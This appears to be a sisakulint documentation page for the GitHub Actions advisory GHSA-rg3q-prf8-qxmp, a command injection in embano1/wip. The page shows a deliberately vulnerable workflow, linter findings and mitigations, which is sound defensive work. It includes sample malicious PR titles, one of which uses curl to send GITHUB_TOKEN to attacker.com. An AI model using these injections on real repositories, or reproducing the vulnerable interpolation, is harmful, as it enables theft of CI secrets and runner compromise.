# GHSA-rg3q-prf8-qxmp

## Summary

| Field | Value |
|-------|-------|
| CVE | CVE-2023-30623 |
| Affected Action | embano1/wip |
| Severity | High (CVSS 8.8) |
| Vulnerability Type | Command Injection (CWE-77) |
| Published | 2025-01-29 |

## Vulnerability Description

The embano1/wip GitHub Action (versions < 2) contains a command injection vulnerability where the `github.event.pull_request.title` parameter is used in a run statement through string interpolation. This creates an insecure execution path where malicious PR titles can execute arbitrary code on GitHub runners.

**Technical Details:**
- CVSS Score: 8.8/10 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
- CWE-77: Improper Neutralization of Special Elements used in a Command (Command Injection)
- EPSS: 1.352% (80th percentile)
- Attack Vector: Network-based with low attack complexity
- Privileges Required: Low (requires ability to create pull requests)

**Attack Vector:**
Any GitHub user can trigger this vulnerability by creating a pull request with a malicious commit message. Note that first-time PR requests require approval, but attackers can:
1. Submit a legitimate PR first to gain approval
2. Then exploit the vulnerability with a malicious PR title

**Impact:**
- Execute arbitrary code on GitHub runners (crypto-mining, resource waste)
- Exfiltrate CI/CD secrets including repository tokens
- Compromise pipeline integrity

**The Fix (v2):**
The security patch implements proper input handling:
- Before: `if [[ '${{ inputs.title }}' =~ ${{ inputs.regex }} ]]; then`
- After: Uses environment variables `env: TITLE: ${{ inputs.title }}` and `REGEX: ${{ inputs.regex }}`
- Added input validation checks to ensure TITLE and REGEX are set
- Improved error handling with validation checks

## Vulnerable Pattern

```yaml
on:
  pull_request:
    types: [opened, edited, synchronize]

jobs:
  check-wip:
    runs-on: ubuntu-latest

    steps:
      - name: Check WIP status
        run: |
          # PR title directly interpolated - vulnerable!
          PR_TITLE="${{ github.event.pull_request.title }}"
          echo "Checking PR title: $PR_TITLE"

          if echo "$PR_TITLE" | grep -i "wip"; then
            echo "This is a WIP PR"
            exit 1
          fi

      - name: Update PR label
        run: |
          # Also vulnerable in gh command
          gh pr edit ${{ github.event.pull_request.number }} \
            --add-label "status: ${{ github.event.pull_request.title }}"
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

**Attack Vector**: An attacker creates a PR with title:
- `WIP: Fix bug $(curl http://attacker.com/?token=$GITHUB_TOKEN)`
- `[WIP] Feature $(printenv >> $GITHUB_STEP_SUMMARY)`
- The injected commands execute during WIP status check

## sisakulint Detection Result

```
script/actions/advisory/GHSA-rg3q-prf8-qxmp-vulnerable.yaml:26:24: code injection (medium): "github.event.pull_request.title" is potentially untrusted. Avoid using it directly in inline scripts. Instead, pass it through an environment variable. See https://sisaku-security.github.io/lint/docs/rules/codeinjectionmedium/ [code-injection-medium]
script/actions/advisory/GHSA-rg3q-prf8-qxmp-vulnerable.yaml:40:37: code injection (medium): "github.event.pull_request.title" is potentially untrusted. Avoid using it directly in inline scripts. Instead, pass it through an environment variable. See https://sisaku-security.github.io/lint/docs/rules/codeinjectionmedium/ [code-injection-medium]
script/actions/advisory/GHSA-rg3q-prf8-qxmp-vulnerable.yaml:40:37: argument injection (medium): "github.event.pull_request.title" is potentially untrusted and used as command-line argument to 'gh'. Attackers can inject malicious options (e.g., --output=/etc/passwd). Use '--' to end option parsing or pass through environment variables. See https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions [argument-injection-medium]
script/actions/advisory/GHSA-rg3q-prf8-qxmp-vulnerable.yaml:47:33: code injection (medium): "github.event.pull_request.title" is potentially untrusted. Avoid using it directly in inline scripts. Instead, pass it through an environment variable. See https://sisaku-security.github.io/lint/docs/rules/codeinjectionmedium/ [code-injection-medium]
```

### Analysis

| Detected | Rule | Category Match |
|----------|------|----------------|
| Yes | CodeInjectionMediumRule | Yes |
| Yes | ArgumentInjectionMediumRule | Yes |

sisakulint successfully detects the command injection vulnerabilities in PR title handling at lines 26, 40, and 47. It also detects the argument injection vulnerability at line 40 where the untrusted PR title is passed to the `gh` command, which could allow option injection attacks.

## Mitigation

1. **Use environment variables**: Primary and most effective mitigation
   ```yaml
   env:
     PR_TITLE: ${{ github.event.pull_request.title }}
   run: |
     echo "Checking PR title"

     if echo "$PR_TITLE" | grep -i "wip"; then
       echo "This is a WIP PR"
       exit 1
     fi
   ```

2. **Safe label update**: Use environment variables for all GitHub CLI operations
   ```yaml
   env:
     PR_NUMBER: ${{ github.event.pull_request.number }}
     PR_TITLE: ${{ github.event.pull_request.title }}
     GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
   run: |
     if [[ "$PR_TITLE" =~ ^[a-zA-Z0-9\ \:\-\_]+$ ]]; then
       gh pr edit "$PR_NUMBER" --add-label "status: reviewed"
     fi
   ```

3. **Input validation**: Validate PR title format
   ```yaml
   env:
     PR_TITLE: ${{ github.event.pull_request.title }}
   run: |
     # Validate title contains only safe characters
     if [[ ! "$PR_TITLE" =~ [\$\`\(] ]]; then
       echo "Valid title"
     else
       echo "Suspicious characters in title"
       exit 1
     fi
   ```

4. **Use GitHub Actions expressions**: Check WIP status using GitHub expressions
   ```yaml
   if: startsWith(github.event.pull_request.title, 'WIP:') || startsWith(github.event.pull_request.title, '[WIP]')
   ```

## References

- [GitHub Advisory](https://github.com/advisories/GHSA-rg3q-prf8-qxmp)
- [Repository Security Advisory](https://github.com/embano1/wip/security/advisories/GHSA-rg3q-prf8-qxmp)
- [Security Patch Commit](https://github.com/embano1/wip/commit/c25450f77ed02c20d00b76ee3b33ff43838739a2)
- [embano1/wip Repository](https://github.com/embano1/wip)
- [sisakulint: Code Injection Rules](../codeinjection.md)
- [sisakulint: Argument Injection Rules](../argumentinjection.md)
- [Sample Vulnerable Workflow](../../script/actions/advisory/GHSA-rg3q-prf8-qxmp-vulnerable.yaml)
- [Sample Safe Workflow](../../script/actions/advisory/GHSA-rg3q-prf8-qxmp-safe.yaml)
